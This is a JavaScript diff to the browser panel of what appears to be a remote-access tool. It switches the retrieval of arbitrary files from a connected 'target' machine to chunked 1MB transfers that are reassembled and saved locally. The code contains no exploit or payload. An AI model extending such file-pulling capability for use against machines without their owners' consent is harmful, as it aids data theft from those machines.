@@ -276,23 +276,56 @@
             }
         };
 
+        let downloadChunks = [];
+        let downloadTotalSize = 0;
+        let downloadStart = 0;
+        let activeDownloadPath = "";
+        const chunkSize = 1024 * 1024; // 1MB chunks
+
         window.downloadRemoteFile = (path) => {
             alert("Download requested. Please wait while the file is retrieved...");
             socket.emit('download-file', { targetId: activeTarget, path: path });
         };
 
-        socket.on('download-result', (data) => {
-            if (data.error) {
-                alert("Download failed: " + data.error);
+        socket.on('download-error', (data) => {
+            alert("Download failed: " + data.error);
+        });
+
+        socket.on('download-start', (data) => {
+            downloadChunks = [];
+            downloadTotalSize = data.size;
+            downloadStart = 0;
+            activeDownloadPath = data.path;
+            
+            if (downloadTotalSize === 0) {
+                alert("File is empty.");
                 return;
             }
-            // Trigger native browser download
-            const link = document.createElement('a');
-            link.href = `data:${data.mime};base64,${data.data}`;
-            link.download = data.name;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            
+            let end = Math.min(chunkSize, downloadTotalSize);
+            socket.emit('request-chunk', { targetId: activeTarget, path: activeDownloadPath, start: 0, end: end });
+        });
+
+        socket.on('download-chunk', (data) => {
+            if (data.data) {
+                downloadChunks.push(data.data);
+            }
+            downloadStart += chunkSize;
+            
+            if (downloadStart >= downloadTotalSize || !data.data) {
+                // Download Complete
+                const completeBase64 = downloadChunks.join('');
+                const link = document.createElement('a');
+                link.href = `data:application/octet-stream;base64,${completeBase64}`;
+                link.download = activeDownloadPath.split('\\').pop();
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } else {
+                // Request next chunk
+                let end = Math.min(downloadStart + chunkSize, downloadTotalSize);
+                socket.emit('request-chunk', { targetId: activeTarget, path: activeDownloadPath, start: downloadStart, end: end });
+            }
         });
 
         document.getElementById('backBtn').onclick = () => {
